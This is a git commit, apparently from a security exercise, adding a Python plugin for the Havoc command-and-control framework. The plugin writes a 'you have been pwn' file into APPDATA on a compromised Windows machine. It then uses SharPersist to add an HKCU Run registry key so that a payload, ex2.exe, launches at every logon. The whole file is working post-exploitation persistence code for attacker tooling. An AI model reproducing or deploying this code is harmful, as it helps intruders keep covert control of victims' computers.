2ea96d2818bcd286996c79bbf15a6ed0e5f8ffd2
Clément Vandewalle <tbhone@MacBook-Pro-de-Clement.local>
2024-12-05 12:41:49 +0100

    add Ex2 file for persistence

---
+++ EX2/ex2.py
@@ -0,0 +1,35 @@
+from havoc import Demon, RegisterCommand
+import os
+import havocui
+
+def create_file_and_persist(demonID, *params):
+    demon = Demon(demonID)
+    TaskID = None
+
+    appdata_path = os.environ.get('APPDATA')
+    file_path = os.path.join(appdata_path, "bahaha.txt")
+    file_content = "you have been pwn"
+
+    try:
+        with open(file_path, 'w') as file:
+            file.write(file_content)
+        demon.ConsoleWrite(demon.CONSOLE_INFO, f"Fichier créé à {file_path}")
+    except Exception as e:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Échec de la création du fichier : {str(e)}")
+        return False
+
+    persist_command = r'dotnet inline-execute /home/tbhone/Downloads/SharPersist.exe -t reg -c "C:\\Windows\\System32\\cmd.exe" -a "/c C:\\Users\\cleme\\Desktop\\ex2.exe" -k "hkcurun" -v "Test Stuff" -m add'
+
+    try:
+        TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Exécution de la commande de persistance")
+        demon.Command(TaskID, persist_command)
+        demon.ConsoleWrite(demon.CONSOLE_INFO, "Commande de persistance exécutée avec succès")
+
+        havocui.messagebox("Succès", "Commande de persistance exécutée avec succès.")
+    except Exception as e:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Échec de l'exécution de la commande de persistance : {str(e)}")
+        return False
+
+    return TaskID
+
+RegisterCommand(create_file_and_persist, "", "create_file_and_persist", "Crée un fichier et configure la persistance avec SharPersist.", 1, "Aucun argument supplémentaire nécessaire", "")
